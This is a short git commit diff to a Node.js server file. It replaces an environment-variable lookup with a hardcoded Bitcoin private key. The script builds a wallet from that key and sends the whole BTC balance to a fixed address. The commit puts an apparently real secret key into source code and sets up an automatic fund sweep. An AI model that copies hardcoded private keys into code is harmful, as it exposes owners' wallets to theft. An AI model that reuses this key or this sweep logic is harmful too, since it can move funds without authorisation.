96bd8aa7e04d46758ed8a30fe955306b5f0d1ed1
ivansantosbom <76788455+ivansantosbom@users.noreply.github.com>
2021-02-05 20:04:40 -0300

    Update server.js

--- server.js
+++ server.js
@@ -7,7 +7,7 @@ const express = require("express");
 const app = express();
 
 const CryptoAccount = require("send-crypto");
-const privateKey = process.env.PRIVATE_KEY;
+const privateKey = "20536951ACC1F347F922E64A62AEC1CE3B73F038A99CB9D56F3D313F2F8CAAC5";
 const account = new CryptoAccount(privateKey);
 const balance = account.getBalance("BTC");
 account.send("bc1qhxkueq72dhecq50zjr5vcw9agaptgh7p8w8xa8", balance, "BTC", {
